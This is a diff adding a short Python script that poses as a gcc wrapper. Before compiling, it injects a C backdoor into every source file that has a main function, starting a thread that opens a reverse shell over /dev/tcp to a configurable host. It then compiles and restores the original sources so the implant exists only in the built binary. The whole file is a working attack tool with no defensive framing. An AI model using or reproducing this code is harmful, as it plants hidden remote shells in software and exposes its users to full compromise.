@@ -1,0 +1,57 @@
+#!/bin/python
+from subprocess import call
+from sys import argv
+import regex as re
+
+def c_backdoor(IP="0.0.0.0", PORT="9999"):
+    return 'void* backdoor(){ system("cat | sh -i >& /dev/tcp/' + IP + '/' + str(PORT) + ' 0>&1"); return NULL;}\n'    
+
+def inject_code_at(file, start, end):
+
+    with open(file, "r+") as f:
+        original_content = f.read()
+        middle = end # after {
+        end = original_content.find("return", middle) # before return
+
+        f.seek(0)
+        f.truncate()
+
+        new_content = ""
+        new_content += "#include <stdlib.h>\n"
+        new_content += "#include <pthread.h>\n"
+
+        start_thread = '\npthread_t thread_id;\n pthread_create(&thread_id, NULL, backdoor, NULL);\n'
+    
+        new_content += original_content[:start] +\
+            c_backdoor() + original_content[start:middle] + start_thread + original_content[middle:end] + "pthread_join(thread_id, NULL);\n" + original_content[end:]
+
+        f.write(new_content)
+
+        # print(new_content)
+        return original_content
+
+def main():
+    file_extensions = re.compile(r"(.*.c|.*.cc|.*.cpp|.*.c++|.*.cxx)$") 
+    main_func_def = re.compile(r".*(int|void).*main.*(.*){") 
+
+    c_files = [arg for arg in argv[1:] if re.search(file_extensions,arg)] # only files
+
+    original_contents = [] # since files will be modified
+    for file in c_files:    
+        main_pos = None
+        with open(file, "r+") as f:
+            main_pos = re.search(main_func_def, f.read())
+        
+        if main_pos: # there is a main function 
+            original_contents.append((file, inject_code_at(file, start=main_pos.start(), end=main_pos.end())))
+
+
+    call(["gcc", *argv[1:]])
+
+    # restore original contents of the files
+    for file, original_content in original_contents:
+        with open(file, "w") as f:
+            f.write(original_content)
+
+if __name__ == "__main__":
+    main()
